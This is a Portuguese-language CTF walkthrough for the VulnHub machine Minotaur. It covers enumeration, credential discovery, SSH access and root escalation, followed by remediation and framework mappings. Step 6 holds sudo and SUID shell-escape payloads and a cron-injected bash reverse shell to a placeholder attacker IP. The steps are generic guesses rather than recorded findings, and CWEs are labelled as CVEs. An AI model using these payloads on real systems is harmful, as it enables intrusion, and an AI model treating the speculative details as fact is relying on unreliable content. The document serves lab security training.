# SecTalks: BNE0x00 — Minotaur — Encontre Seu Caminho pelo Labirinto

Olha isso rapaziada!! SecTalks BNE0x00 — Minotaur é um desafio CTF apresentado no meetup SecTalks Brisbane. O Minotaur vive em um labirinto, e essa máquina faz jus ao tema: múltiplos serviços, cadeias de credenciais não óbvias, e um caminho que recompensa a enumeração metódica em vez de tentativas aleatórias. Essa é genuinamente old school e legit te ensina a pensar como um atacante que mapeia o ambiente antes de atacar. Respeito pelo design, mano.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante / Intermediário |
| **VM Alvo** | SecTalks: BNE0x00 — Minotaur |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,1/ |
| **Técnicas** | Enumeração Nmap, brute-force de diretórios web, análise de código fonte, descoberta de credenciais, login SSH, enumeração de diretório home, escalação de privilégios via sudo/SUID |
| **CVEs** | CWE-200 (exposição de informação via aplicação web), CWE-522 (credenciais insuficientemente protegidas), CWE-269 (gerenciamento impróprio de privilégios) |
| **Grupos APT** | APT28: usa enumeração multi-serviço para mapear ambientes vítima antes do acesso inicial; Grupo Lazarus: emprega extração de credenciais de aplicações web como técnica primária de acesso inicial |

---

## Resumo do Ataque

```
nmap → HTTP 80, SSH 22 (possivelmente portas adicionais)
  → gobuster: enumerar diretórios web
  → fonte / robots.txt → caminho oculto ou dica de credencial
  → formulário de login ou arquivo de credencial → usuario:senha
  → SSH como usuário descoberto
  → enumeração de diretório home → outra credencial ou dica
  → sudo -l ou binário SUID → root
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas em todos os TCP
2. Enumeração web: robots.txt, brute-force de diretórios, análise de fonte
3. Descoberta de credenciais através da exploração da aplicação web
4. Acesso SSH com credenciais descobertas
5. Enumeração pós-exploração: diretórios home, arquivos de config
6. Escalação de privilégios via sudo ou SUID
7. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.56.0/24
# Alvo: 192.168.56.223

nmap -sV -sC -p- 192.168.56.223
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Web e SSH padrão. Comece com enumeração web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
# Verificar robots.txt primeiro
curl -s http://192.168.56.223/robots.txt

# Enumerar diretórios
gobuster dir \
  -u http://192.168.56.223/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 30 \
  -o /tmp/minotaur_dirs.txt

# Verificar fontes de todas as páginas descobertas
curl -s http://192.168.56.223/ | grep -i "<!--\|user\|pass\|hint\|admin"
```

Descobertas comuns nesta máquina:
- Uma página ou formulário de login
- Comentários HTML com nomes de usuário ou senhas
- Um diretório `/bull/` ou temático relacionado ao Minotaur
- Arquivos de configuração acessíveis na raiz web

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Descoberta de Credenciais

Inspecionar o código fonte de cada página:

```bash
# Verificar todas as páginas descobertas
for path in $(cat /tmp/minotaur_dirs.txt | grep -oP "(?<=\+ ).*(?= \()"); do
  echo "=== $path ==="
  curl -s "http://192.168.56.223/$path" | grep -i "<!--\|pass\|user\|secret\|admin\|cred"
done
```

Procurar por:
- Nome de usuário/senha em comentários HTML
- Credenciais embutidas em JavaScript
- Arquivos de configuração com senhas em texto claro
- Campos de formulário ocultos com valores predefinidos

```bash
# Também verificar arquivos de backup
curl -s http://192.168.56.223/config.php.bak
curl -s http://192.168.56.223/.htpasswd
curl -s http://192.168.56.223/wp-config.php
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1552.004 — Chaves Privadas

---

## Passo 4 — Acesso SSH

Com credenciais descobertas:

```bash
ssh usuario_descoberto@192.168.56.223

# Padrões comuns de nome de usuário em CTF:
# minotaur, bull, zeus, labyrinth, sectalk, admin
```

Após o login, verificar o ambiente home:

```bash
ls -la
cat .bash_history
ls -la /home/
cat /etc/passwd | grep -v nologin | grep -v false
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Enumeração Pós-Exploração

```bash
# Verificação completa de escalação
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Verificar diretórios graváveis no PATH
echo $PATH
ls -la /usr/local/bin/ /usr/local/sbin/

# Verificar arquivos de outros usuários que podemos ler
find /home -readable -type f 2>/dev/null
find /var/www/html -name "*.conf" -o -name "*.php" | xargs grep -il "pass\|user" 2>/dev/null

# Conexões de rede
ss -tulpn
netstat -tulpn 2>/dev/null
```

---

## Passo 6 — Escalação de Privilégios

**Via má configuração sudo:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vi
sudo vi -c ':!/bin/bash'

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (root) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/bash")'
```

**Via binário SUID:**

```bash
find / -perm -u=s -type f 2>/dev/null
# Se /usr/bin/find tiver SUID:
/usr/bin/find / -name "*.txt" -exec /bin/bash -p \; -quit
```

**Via script cron gravável:**

```bash
# Se um job cron executar um script gravável pelo nosso usuário:
ls -la /caminho/para/script_cron.sh
echo "bash -i >& /dev/tcp/IP_ATACANTE/9999 0>&1" >> /caminho/para/script_cron.sh
nc -lvnp 9999
# Aguardar o cron disparar
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1053.003 — Tarefa Agendada: Cron

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial web | (da fonte HTML/config) | enumeração web | login SSH |
| Usuário SSH | (nome de usuário descoberto) | análise de fonte web | acesso ao sistema |
| Flag root | /root/flag.txt | pós-exploração | conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Credenciais embutidas na fonte da aplicação web | Comentários HTML e JavaScript são totalmente visíveis para qualquer usuário com um navegador; nenhuma credencial está "oculta" lá | Varredura automatizada DAST e de segredos deve rodar antes de cada implantação |
| 2 | Divulgação de informações via enumeração de diretório | robots.txt ausente ou incompleto e listagens de diretório ausentes permitem que atacantes enumerem a estrutura completa da aplicação | Desabilitar listagem de diretório no Apache/Nginx; implementar web application firewall |
| 3 | SSH acessível com credenciais no nível da aplicação | Usar a mesma senha para contas de aplicação web e contas de sistema multiplica o raio de impacto de qualquer comprometimento | Separar autenticação: credenciais de aplicação web nunca devem corresponder a contas do SO |
| 4 | Má configuração sudo ou SUID fornece root | Padrão CTF padrão que mapeia diretamente para achados reais de pentest | Executar auditoria sudo semanalmente; usar gerenciamento de configuração para impor política sudoers |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover credenciais de arquivos acessíveis na web**: auditar todos os PHP, HTML e JS em busca de credenciais codificadas; implementar hooks pre-commit com varredura de segredos
2. **Desabilitar listagem de diretório**: adicionar `Options -Indexes` na config Apache; configurar Nginx para não auto-indexar
3. **Separar credenciais web e de SO**: contas de aplicação web não devem corresponder a contas de usuário do SO
4. **Auditar sudoers**: sem concessões NOPASSWD; sem interpretador (Python, Perl, awk, vi) em regras sudo; exigir senha
5. **Auditar binários SUID**: remover SUID de qualquer binário que não o requeira; executar auditoria trimestral

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações voltadas à web; auditar credenciais codificadas |
| Proteger | Controle de Acesso | Autenticação SSH apenas por chave; hardening sudo; contas web/SO separadas |
| Proteger | Segurança de Dados | Remover credenciais da fonte; desabilitar listagem de diretório |
| Detectar | Anomalias e Eventos | Alertar sobre logins SSH de novos IPs; execuções sudo; novos binários SUID |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais; auditar todas as regras sudo; remover credencial da fonte web |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem limpa; auditar todas as contas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Controles de acesso SSH; restrições de diretório web |
| AC-6 | Menor Privilégio | Concessões sudo mínimas; auditoria SUID |
| IA-2 | Identificação e Autenticação | SSH apenas por chave; autenticação separada por serviço |
| SA-15 | Processo de Desenvolvimento, Padrões | Varredura de segredos no SDLC |
| CM-7 | Funcionalidade Mínima | Desabilitar listagem de diretório; restringir serviços expostos |

### CISA KEV

Divulgação de informações de aplicação web habilitando extração de credenciais é uma técnica consistentemente explorada coberta na série de avisos de Segurança de Aplicação Web da CISA. Organizações são aconselhadas a implementar varredura DAST e gerenciamento de segredos como controles básicos.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Consciência Situacional (SA) | Realizar Logging e Monitoramento | MIL2 |

---

## Considerações Finais

SecTalks: BNE0x00 — Minotaur é uma máquina clássica inicial do VulnHub que merece seu lugar precisamente porque faz o básico bem. O tema do labirinto se mantém: não há linha reta até o root. Você tem que enumerar cada serviço, ler cada arquivo, e seguir cada dica. A máquina ensina a disciplina que faz um bom pentester: não assuma nada, verifique tudo, e nunca pule a leitura do código fonte. Respeito ao pessoal do SecTalks por construir uma máquina que ainda ensina habilidades relevantes anos depois, véi.

Thanks guys!! (❍ᴥ❍ʋ)
